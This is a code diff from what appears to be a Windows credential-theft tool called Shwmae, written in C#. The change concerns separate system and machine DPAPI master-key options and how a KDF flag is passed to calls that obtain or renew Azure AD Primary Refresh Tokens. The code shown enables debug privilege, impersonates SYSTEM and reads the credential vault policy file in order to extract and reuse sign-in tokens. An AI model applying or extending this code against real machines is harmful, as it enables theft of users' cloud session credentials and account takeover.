@@ -220,7 +220,6 @@ namespace Shwmae {
             X509Certificate2 deviceCert = null;
             WebAuthnHttpListener listener = null;
 
-
             if (!NtToken.EnableDebugPrivilege()) {
                 Console.WriteLine("[!] Failed to enable debug privileges, are you elevated?");
                 return;
@@ -230,10 +229,14 @@ namespace Shwmae {
 
                 if (baseOptions.SystemDPAPI == null) {
                     systemKeyProvider = new MasterKeyProviderSystemUser();
-                    machineKeyProvider = new MasterKeyProviderLocalMachine();
                 } else {
                     systemKeyProvider = new MasterKeyProviderSystemUser(baseOptions.SystemDPAPI.FromHex());
-                    machineKeyProvider = new MasterKeyProviderLocalMachine(baseOptions.SystemDPAPI.FromHex());
+                }
+
+                if(baseOptions.MachineDPAPI == null) { 
+                    machineKeyProvider = new MasterKeyProviderLocalMachine();
+                } else {                   
+                    machineKeyProvider = new MasterKeyProviderLocalMachine(baseOptions.MachineDPAPI.FromHex());
                 }
 
                 var vaultPolicy = new Policy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\Policy.vpol"));
@@ -374,7 +377,7 @@ namespace Shwmae {
                         }
 
                         ctx.Revert();
-                        aadKey.RenewPRT(prtOptions.SessionKey, prtOptions.PRT, prtOptions.KDFv1 > 0);
+                        aadKey.RenewPRT(prtOptions.SessionKey, prtOptions.PRT, prtOptions.KDFv1);
                         PrintPRTInfo(aadKey);
 
                     } else {
@@ -392,7 +395,7 @@ namespace Shwmae {
 
                         ctx.Revert();
                         using (var systemCtx = Utils.Impersonate("SYSTEM")) {
-                            aadKey.GetPRT(protector, systemKeyProvider, deviceKey, deviceCert, prtOptions.KDFv1 > 0);          
+                            aadKey.GetPRT(protector, systemKeyProvider, deviceKey, deviceCert, prtOptions.KDFv1);          
                         }
                         PrintPRTInfo(aadKey);
                     }
